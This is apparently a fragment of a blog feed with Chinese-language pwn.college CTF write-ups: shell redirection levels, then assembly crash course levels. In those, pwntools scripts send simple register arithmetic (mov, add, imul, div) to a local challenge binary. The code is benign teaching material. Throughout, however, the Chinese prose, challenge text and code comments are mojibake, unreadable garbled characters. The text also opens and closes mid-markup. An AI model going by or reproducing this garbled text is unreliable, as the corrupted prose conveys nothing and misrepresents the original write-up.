title="2"></a>2</h1><p>è¿›å…¥/usr/bin/bash</p><p>è¿è¡Œç¨‹åº</p><p>å¡ä½ï¼Œè¾“å…¥å¯†ç å³å¯</p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>è¿›å…¥/usr/bin/bash</p><p>è¿è¡Œ/challenge/embryoio_level3 vnafzqlxecå³å¯</p><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>è¿›å…¥/usr/bin/bashï¼ˆåé¢å°±çœç•¥è¿™ä¸€å¥äº†ï¼‰</p><p>export yqxjyb=isdvinxiir</p><p>è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</p><h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><p>è¾“å…¥é‡å®šå‘<br>echo ztikhrrc &gt; /tmp/inujwj</p><p>/challenge/embryoio_level5 &lt; /tmp/inujwj</p><h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><p>è¾“å‡ºé‡å®šå‘</p><p>/challenge/embryoio_level6 &gt; /tmp/enhwpg</p><p>cat /tmp/enhwpg</p><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>æ¸…é™¤æ‰€æœ‰ç¯å¢ƒå˜é‡</p><p>env -i /challenge/embryoio_level</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn college åˆ·é¢˜è®°å½•ï¼šassembly crash course</title>
    <link href="/p/344bba9e/"/>
    <url>/p/344bba9e/</url>
    
    <content type="html"><![CDATA[<p>æ±‡ç¼–ï¼Œå¤ªç¾ä¸½è¾£</p><span id="more"></span><p><img src="/image/pwn-college.png"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ul><li>ç”¨pythonçš„pwnåº“è§£é¢˜ä¼šéå¸¸æ–¹ä¾¿ã€‚å»ºè®®è¯»è¯»pwnåº“çš„å®˜æ–¹æ–‡æ¡£ï¼Œå†™çš„å·²ç»éå¸¸æ¸…æ¥šäº†<ul><li>pwntoolså¤ªå¥½ç”¨äº†</li><li>é¡ºä¾¿å‘ç°äº†readallSçš„è¾“å‡ºæ¯”readallæ›´å‹å¥½</li></ul></li><li>æ€»çš„æ¥è¯´å­¦ä¹ äº†åŸºæœ¬çš„æ±‡ç¼–ç¨‹åºçš„ç¼–å†™ï¼ˆèµ‹å€¼ã€è¿ç®—ã€åˆ†æ”¯ã€å¾ªç¯ç­‰åŸºæœ¬æ“ä½œï¼‰ï¼Œä»¥åŠlabelã€reptä¹‹æµçš„è¿ç”¨ï¼Œæ ˆå†…å­˜å¸ƒå±€ç­‰</li></ul><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>è®¾ç½®å¯„å­˜å™¨</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs arduino">è¦ä¸ä»»ä½•çº§åˆ«è¿›è¡Œäº¤äº’ï¼Œæ‚¨éœ€è¦é€šè¿‡æ ‡å‡†è¾“å…¥(stdin)å‘é€åŸå§‹å­—èŠ‚ç»™è¯¥ç¨‹åºã€‚  <br>ä¸ºäº†é«˜æ•ˆåœ°è§£å†³è¿™äº›é—®é¢˜ï¼Œé¦–å…ˆè¿è¡Œç¨‹åºä»¥æŸ¥çœ‹æŒ‘æˆ˜è¯´æ˜ã€‚  <br>ç„¶åç¼–å†™ã€æ±‡ç¼–å¹¶å°†å­—èŠ‚ä¼ è¾“åˆ°è¯¥ç¨‹åºã€‚<br><br>ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨åœ¨ <span class="hljs-keyword">asm</span>.S æ–‡ä»¶ä¸­ç¼–å†™äº†æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥å°†å…¶æ±‡ç¼–ä¸ºç›®æ ‡æ–‡ä»¶ï¼š  <br>as -o <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.S<br><br>ç„¶åï¼Œæ‚¨å¯ä»¥å°† .text æ®µï¼ˆæ‚¨çš„ä»£ç ï¼‰å¤åˆ¶åˆ° <span class="hljs-keyword">asm</span>.bin æ–‡ä»¶ä¸­ï¼š  <br>objcopy -O binary --only-section=.text <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.bin<br><br>æœ€åï¼Œå°†å…¶å‘é€ç»™æŒ‘æˆ˜ç¨‹åºï¼š  <br>cat ./<span class="hljs-keyword">asm</span>.bin | /challenge/run<br><br>æ‚¨ç”šè‡³å¯ä»¥å°†å…¶ä½œä¸ºä¸€ä¸ªå‘½ä»¤è¿è¡Œï¼š  <br>as -o <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.S &amp;&amp; objcopy -O binary --only-section=.text ./<span class="hljs-keyword">asm</span>.o ./<span class="hljs-keyword">asm</span>.bin &amp;&amp; cat ./<span class="hljs-keyword">asm</span>.bin | /challenge/run<br><br>åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œæ‚¨å°†ä½¿ç”¨å¯„å­˜å™¨ã€‚æ‚¨å°†è¢«è¦æ±‚ä¿®æ”¹æˆ–è¯»å–å¯„å­˜å™¨çš„å†…å®¹ã€‚<br><br>åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œæ‚¨å°†ä½¿ç”¨å¯„å­˜å™¨ï¼è¯·è®¾ç½®ä»¥ä¸‹å†…å®¹ï¼š  <br>rdi = <span class="hljs-number">0x1337</span><br><br>è¯·ä»¥å­—èŠ‚å½¢å¼æä¾›æ‚¨çš„æ±‡ç¼–ä»£ç ï¼ˆæœ€å¤š<span class="hljs-number">0x1000</span>å­—èŠ‚ï¼‰ï¼š<br></code></pre></td></tr></table></figure><p>æ±‡ç¼–-ã€‹å­—èŠ‚ç çš„è¿‡ç¨‹</p><p>é¢˜ç›®æç¤ºå¯ä»¥ä½¿ç”¨aså‘½ä»¤å¾—åˆ°ç¨‹åºçš„textçš„èŠ‚æ®µï¼Œç„¶åç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æŸ¥çœ‹ï¼Œä½†æ˜¯è¿˜æ˜¯pwnåº“æ¯”è¾ƒæ–¹ä¾¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p=process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><span class="hljs-comment"># å‘é€æ•°æ®</span><br>p.send(asm(<span class="hljs-string">&#x27;mov rdi,0x1337&#x27;</span>))<br><span class="hljs-comment"># æ‰“å°è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>è®¾ç½®å¤šä¸ªå¯„å­˜å™¨</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs arduino">æ¬¢è¿æ¥åˆ° ASMLevel2<br>==================================================<br><br>è¦ä¸ä»»ä½•å…³å¡è¿›è¡Œäº¤äº’ï¼Œæ‚¨éœ€è¦é€šè¿‡æ ‡å‡†è¾“å…¥å°†åŸå§‹å­—èŠ‚å‘é€ç»™è¯¥ç¨‹åºã€‚<br>ä¸ºäº†æœ‰æ•ˆåœ°è§£å†³è¿™äº›é—®é¢˜ï¼Œé¦–å…ˆè¿è¡Œç¨‹åºä»¥æŸ¥çœ‹æŒ‘æˆ˜è¯´æ˜ã€‚<br>ç„¶åç¼–å†™ã€æ±‡ç¼–å¹¶å°†å­—èŠ‚ä¼ è¾“åˆ°è¯¥ç¨‹åºã€‚<br><br>ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å°†æ±‡ç¼–ä»£ç ç¼–å†™åœ¨ <span class="hljs-keyword">asm</span>.S æ–‡ä»¶ä¸­ï¼Œå¯ä»¥å°†å…¶æ±‡ç¼–ä¸ºç›®æ ‡æ–‡ä»¶ï¼š<br>  as -o <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.S<br><br>ç„¶åï¼Œæ‚¨å¯ä»¥å°† .text æ®µï¼ˆæ‚¨çš„ä»£ç ï¼‰å¤åˆ¶åˆ° <span class="hljs-keyword">asm</span>.bin æ–‡ä»¶ä¸­ï¼š<br>  objcopy -O binary --only-section=.text <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.bin<br><br>æœ€åï¼Œå°†å…¶å‘é€åˆ°æŒ‘æˆ˜ç¨‹åºï¼š<br>  cat ./<span class="hljs-keyword">asm</span>.bin | /challenge/run<br><br>æ‚¨ç”šè‡³å¯ä»¥å°†å…¶ä½œä¸ºä¸€ä¸ªå‘½ä»¤è¿è¡Œï¼š<br>  as -o <span class="hljs-keyword">asm</span>.o <span class="hljs-keyword">asm</span>.S &amp;&amp; objcopy -O binary --only-section=.text ./<span class="hljs-keyword">asm</span>.o ./<span class="hljs-keyword">asm</span>.bin &amp;&amp; cat ./<span class="hljs-keyword">asm</span>.bin | /challenge/run<br><br>åœ¨è¿™ä¸ªå…³å¡ä¸­ï¼Œæ‚¨å°†ä½¿ç”¨å¯„å­˜å™¨ã€‚æ‚¨å°†è¢«è¦æ±‚ä¿®æ”¹æˆ–è¯»å–å¯„å­˜å™¨çš„å€¼ã€‚<br><br>åœ¨è¿™ä¸ªå…³å¡ä¸­ï¼Œæ‚¨å°†ä½¿ç”¨å¤šä¸ªå¯„å­˜å™¨ã€‚è¯·è®¾ç½®ä»¥ä¸‹å€¼ï¼š<br>  rax = <span class="hljs-number">0x1337</span><br>  r12 = <span class="hljs-number">0xCAFED00D1337BEEF</span><br>  rsp = <span class="hljs-number">0x31337</span><br></code></pre></td></tr></table></figure><p>ç±»ä¼¼ä¸Šé¢ï¼Œç»™shellcodeè¿½åŠ ç‚¹asmå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br><span class="hljs-comment"># è®¾ç½®å¯„å­˜å™¨çš„å€¼</span><br>shellcode = asm(<span class="hljs-string">&#x27;mov rax, 0x1337&#x27;</span>)<br>shellcode += asm(<span class="hljs-string">&#x27;mov r12, 0xCAFED00D1337BEEF&#x27;</span>)<br>shellcode += asm(<span class="hljs-string">&#x27;mov rsp, 0x31337&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(shellcode)<br><br>pause()<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>ä¸ºäº†ä¸ä»»ä½•çº§åˆ«è¿›è¡Œäº¤äº’ï¼Œä½ éœ€è¦é€šè¿‡æ ‡å‡†è¾“å…¥(stdin)å‘é€åŸå§‹å­—èŠ‚ç»™è¿™ä¸ªç¨‹åºã€‚<br>ä¸ºäº†é«˜æ•ˆåœ°è§£å†³è¿™äº›é—®é¢˜ï¼Œé¦–å…ˆè¿è¡Œç¨‹åºä»¥æŸ¥çœ‹æŒ‘æˆ˜è¯´æ˜ã€‚<br>ç„¶åç¼–å†™ã€æ±‡ç¼–å¹¶å°†å­—èŠ‚å‘é€ç»™è¯¥ç¨‹åºã€‚<br><br>ä¾‹å¦‚ï¼Œå¦‚æœä½ å°†æ±‡ç¼–ä»£ç å†™åœ¨ asm.S æ–‡ä»¶ä¸­ï¼Œå¯ä»¥å°†å…¶æ±‡ç¼–ä¸ºç›®æ ‡æ–‡ä»¶ï¼š<br>  <span class="hljs-keyword">as</span> -o asm.o asm.S<br><br>ç„¶åï¼Œå°† .text æ®µï¼ˆä½ çš„ä»£ç ï¼‰å¤åˆ¶åˆ° asm.<span class="hljs-built_in">bin</span> æ–‡ä»¶ä¸­ï¼š<br>  objcopy -O binary --only-section=.text asm.o asm.<span class="hljs-built_in">bin</span><br><br>æœ€åï¼Œå°†å…¶å‘é€ç»™æŒ‘æˆ˜ç¨‹åºï¼š<br>  cat ./asm.<span class="hljs-built_in">bin</span> | /challenge/run<br><br>ä½ ç”šè‡³å¯ä»¥å°†å…¶ä½œä¸ºä¸€ä¸ªå‘½ä»¤è¿è¡Œï¼š<br>  <span class="hljs-keyword">as</span> -o asm.o asm.S &amp;&amp; objcopy -O binary --only-section=.text ./asm.o ./asm.<span class="hljs-built_in">bin</span> &amp;&amp; cat ./asm.<span class="hljs-built_in">bin</span> | /challenge/run<br><br>åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨å¯„å­˜å™¨è¿›è¡Œæ“ä½œã€‚ä½ å°†è¢«è¦æ±‚ä¿®æ”¹æˆ–è¯»å–å¯„å­˜å™¨çš„å€¼ã€‚<br><br>æˆ‘ä»¬å°†åœ¨æ¯æ¬¡è¿è¡Œä¹‹å‰åŠ¨æ€è®¾ç½®ä¸€äº›å€¼åˆ°å†…å­˜ä¸­ã€‚æ¯æ¬¡è¿è¡Œæ—¶è¿™äº›å€¼ä¼šå‘ç”Ÿå˜åŒ–ã€‚è¿™æ„å‘³ç€ä½ éœ€è¦å¯¹å¯„å­˜å™¨è¿›è¡ŒæŸç§å½¢å¼çš„è®¡ç®—æ“ä½œã€‚æˆ‘ä»¬ä¼šå‘Šè¯‰ä½ å“ªäº›å¯„å­˜å™¨è¢«è®¾ç½®ä»¥åŠä½ åº”è¯¥å°†ç»“æœæ”¾åœ¨å“ªé‡Œã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç»“æœåº”è¯¥æ”¾åœ¨ rax å¯„å­˜å™¨ä¸­ã€‚<br><br>x86 æŒ‡ä»¤é›†ä¸­å­˜åœ¨è®¸å¤šå¯ä»¥å¯¹å¯„å­˜å™¨å’Œå†…å­˜æ‰§è¡Œå¸¸è§„æ•°å­¦è¿ç®—çš„æŒ‡ä»¤ã€‚<br><br>ç®€å†™å½¢å¼ä¸­ï¼Œå½“æˆ‘ä»¬è¯´ A += B æ—¶ï¼Œå®é™…ä¸Šæ˜¯ A = A + Bã€‚<br><br>ä»¥ä¸‹æ˜¯ä¸€äº›æœ‰ç”¨çš„æŒ‡ä»¤ï¼š<br>  add reg1, reg2       &lt;=&gt;     reg1 += reg2<br>  sub reg1, reg2       &lt;=&gt;     reg1 -= reg2<br>  imul reg1, reg2      &lt;=&gt;     reg1 *= reg2<br><br>é™¤æ³•(div)æ›´å¤æ‚ï¼Œæˆ‘ä»¬ç¨åä¼šè®¨è®ºå®ƒã€‚<br>æ³¨æ„ï¼šæ‰€æœ‰çš„ <span class="hljs-string">&#x27;regX&#x27;</span> éƒ½å¯ä»¥æ›¿æ¢ä¸ºå¸¸æ•°æˆ–å†…å­˜ä½ç½®ã€‚<br><br>è¯·æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<br>  å°† <span class="hljs-number">0x331337</span> åŠ åˆ° rdi ä¸­<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š<br>  rdi = <span class="hljs-number">0x937</span><br>  <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;add rdi, 0x331337&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>ä¸¤ä¸ªå¯„å­˜å™¨ç›¸ä¹˜ï¼ŒåŠ ä¸Šå¦ä¸€ä¸ªå¯„å­˜å™¨ï¼Œç„¶åç»“æœèµ‹å€¼ç»™rax</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡ è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    imul rdi,rsi</span><br><span class="hljs-string">    mov rax,rdi</span><br><span class="hljs-string">    add rax,rdx&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨å¯„å­˜å™¨è¿›è¡Œæ“ä½œã€‚ä½ å°†è¢«è¦æ±‚ä¿®æ”¹æˆ–è¯»å–å¯„å­˜å™¨çš„å€¼ã€‚<br><br>æˆ‘ä»¬å°†åœ¨æ¯æ¬¡è¿è¡Œä¹‹å‰åŠ¨æ€è®¾ç½®ä¸€äº›å€¼åˆ°å†…å­˜ä¸­ã€‚æ¯æ¬¡è¿è¡Œæ—¶è¿™äº›å€¼ä¼šå‘ç”Ÿå˜åŒ–ã€‚è¿™æ„å‘³ç€ä½ éœ€è¦å¯¹å¯„å­˜å™¨è¿›è¡ŒæŸç§å½¢å¼çš„è®¡ç®—æ“ä½œã€‚æˆ‘ä»¬ä¼šäº‹å…ˆå‘Šè¯‰ä½ å“ªäº›å¯„å­˜å™¨å·²ç»è®¾ç½®ï¼Œå¹¶ä¸”ä½ åº”è¯¥å°†ç»“æœæ”¾åœ¨å“ªé‡Œã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç»“æœåº”è¯¥æ”¾åœ¨ <span class="hljs-built_in">rax</span> å¯„å­˜å™¨ä¸­ã€‚<br><br>åœ¨ x86 ä¸­ï¼Œé™¤æ³•ä¸æ™®é€šæ•°å­¦ä¸­çš„é™¤æ³•æœ‰æ‰€ä¸åŒã€‚è¿™é‡Œçš„æ•°å­¦ç§°ä¸ºæ•´æ•°è¿ç®—ã€‚è¿™æ„å‘³ç€æ¯ä¸ªå€¼éƒ½æ˜¯ä¸€ä¸ªæ•´æ•°ã€‚<br><br>ä¸¾ä¸ªä¾‹å­ï¼š<span class="hljs-number">10</span> / <span class="hljs-number">3</span> = <span class="hljs-number">3</span> åœ¨æ•´æ•°è¿ç®—ä¸­ã€‚<br><br>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ<br><br>å› ä¸º <span class="hljs-number">3.33</span> è¢«èˆå…¥ä¸ºä¸€ä¸ªæ•´æ•°ã€‚<br><br>åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä¸é™¤æ³•ç›¸å…³çš„æŒ‡ä»¤æ˜¯ï¼š<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, reg1<span class="hljs-comment">; div reg2</span><br><br>æ³¨æ„ï¼š<span class="hljs-keyword">div</span> æ˜¯ä¸€æ¡ç‰¹æ®Šçš„æŒ‡ä»¤ï¼Œå¯ä»¥å°†ä¸€ä¸ª <span class="hljs-number">128</span> ä½çš„è¢«é™¤æ•°é™¤ä»¥ä¸€ä¸ª <span class="hljs-number">64</span> ä½çš„é™¤æ•°ï¼Œå¹¶ä¸”åªä½¿ç”¨ä¸€ä¸ªå¯„å­˜å™¨ä½œä¸ºæ“ä½œæ•°æ¥å­˜å‚¨å•†å’Œä½™æ•°ã€‚<br><br>è¿™ä¸ªå¤æ‚çš„ <span class="hljs-keyword">div</span> æŒ‡ä»¤å¦‚ä½•å·¥ä½œå¹¶æ“ä½œä¸€ä¸ª <span class="hljs-number">128</span> ä½çš„è¢«é™¤æ•°ï¼ˆå®ƒæ˜¯å¯„å­˜å™¨å¤§å°çš„ä¸¤å€ï¼‰ï¼Ÿ<br><br>å¯¹äºæŒ‡ä»¤ï¼š<span class="hljs-keyword">div</span> regï¼Œä»¥ä¸‹æ“ä½œå‘ç”Ÿï¼š<br>  <span class="hljs-built_in">rax</span> = <span class="hljs-built_in">rdx</span>:<span class="hljs-built_in">rax</span> / reg<br>  <span class="hljs-built_in">rdx</span> = ä½™æ•°<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">rdx:</span><span class="hljs-built_in">rax</span> è¡¨ç¤º <span class="hljs-built_in">rdx</span> æ˜¯ <span class="hljs-number">128</span> ä½è¢«é™¤æ•°çš„é«˜ <span class="hljs-number">64</span> ä½ï¼Œ<span class="hljs-built_in">rax</span> æ˜¯ <span class="hljs-number">128</span> ä½è¢«é™¤æ•°çš„ä½ <span class="hljs-number">64</span> ä½ã€‚<br><br>åœ¨è°ƒç”¨ <span class="hljs-keyword">div</span> ä¹‹å‰ï¼Œä½ å¿…é¡»å°å¿ƒ <span class="hljs-built_in">rdx</span> å’Œ <span class="hljs-built_in">rax</span> ä¸­çš„å†…å®¹ã€‚<br><br>è¯·è®¡ç®—ä»¥ä¸‹å†…å®¹ï¼š<br>  speed = distance / timeï¼Œå…¶ä¸­ï¼š<br>    distance = <span class="hljs-built_in">rdi</span><br>    time = <span class="hljs-built_in">rsi</span><br>    speed = <span class="hljs-built_in">rax</span><br><br>æ³¨æ„ï¼Œdistance æœ€å¤šæ˜¯ä¸€ä¸ª <span class="hljs-number">64</span> ä½çš„å€¼ï¼Œæ‰€ä»¥åœ¨é™¤æ³•è¿ç®—æ—¶ <span class="hljs-built_in">rdx</span> åº”è¯¥ä¸º <span class="hljs-number">0</span>ã€‚<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š<br>  <span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x1d8c</span><br>  <span class="hljs-built_in">rsi</span> = <span class="hljs-number">0x40</span><br></code></pre></td></tr></table></figure><p>è®¡ç®—speed = distance / time</p><ul><li>distance æœ€å¤šæ˜¯ä¸€ä¸ª 64 ä½çš„å€¼ï¼Œæ‰€ä»¥åœ¨é™¤æ³•è¿ç®—æ—¶ rdx åº”è¯¥ä¸º 0</li><li>  rax = rdx:rax / reg  ; rdx = ä½™æ•°<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 